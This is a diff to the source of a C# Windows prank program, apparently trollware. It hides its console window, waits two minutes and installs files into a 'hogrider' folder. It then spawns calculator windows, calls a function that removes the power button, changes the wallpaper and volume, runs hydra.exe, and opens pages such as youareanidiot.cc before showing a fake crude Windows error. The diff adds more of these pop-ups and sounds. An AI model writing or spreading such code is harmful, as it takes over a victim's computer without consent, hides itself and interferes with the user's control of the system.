@@ -9,9 +9,7 @@ static extern IntPtr GetConsoleWindow();
 
 [DllImport("user32.dll")]
 static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
 const int SW_HIDE = 0;
-
 var handle = GetConsoleWindow();
 ShowWindow(handle, SW_HIDE);
 
@@ -21,12 +19,14 @@ string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 string dir = path + "\\hogrider\\";
 
 Thread.Sleep(60000 * 2); // 2 Minutes
+Console.WriteLine("Timeout 2 Mins ...");
 
 // Check if directory exists
 if (Directory.Exists(dir))
 {
     Console.WriteLine("Directory found, skipping installs...");
-} else
+}
+else
 {
     Directory.CreateDirectory(dir);
     Install.Main();
@@ -47,8 +47,9 @@ for (int i = 0; i < 12; i++)
     Process.Start("calc");
 }
 
+Utils.OpenFile(dir, "enemy.mp3");
 
-Utils.ChangeVolume();
+
 Utils.RemovePowerButton();
 
 Thread.Sleep(10 * 1000);
@@ -71,6 +72,9 @@ Thread.Sleep(2 * 1000);
 Utils.SetWallpaper(dir + "\\woman.png");
 Utils.OpenUrl("https://preview.redd.it/06badqei8wl81.png?auto=webp&s=061916c8cf0920bcd59b05a0a22d8994d5bfd3c5");
 
+Thread.Sleep(2000);
+Utils.OpenFile(dir, "enemy.mp3");
+
 Thread.Sleep(7 * 1000);
 
 for (int i = 0; i < 5; i++)
@@ -84,6 +88,21 @@ Utils.OpenFile(dir, "hydra.exe");
 
 Utils.ChangeVolume();
 Utils.OpenFile(dir, "hog-rider.mp3");
+
+Thread.Sleep(5000);
+
+Utils.ChangeVolume();
+Utils.OpenUrl("https://www.youtube.com/watch?v=8-NcrRzH0vA"); // Among us drip
+
+Thread.Sleep(300);
+Utils.ChangeVolume();
+Utils.OpenUrl("https://www.youtube.com/watch?v=DmxwCxV2CfA"); // Bad piggies
+
+Thread.Sleep(12000);
+Utils.OpenUrl("https://piv.pivpiv.dk/");
+
+Thread.Sleep(5000);
+Utils.OpenUrl("https://youareanidiot.cc/");
 
 
 Utils.MessageBoxError("Error... U fucked up", "Windows XP Error reporter");
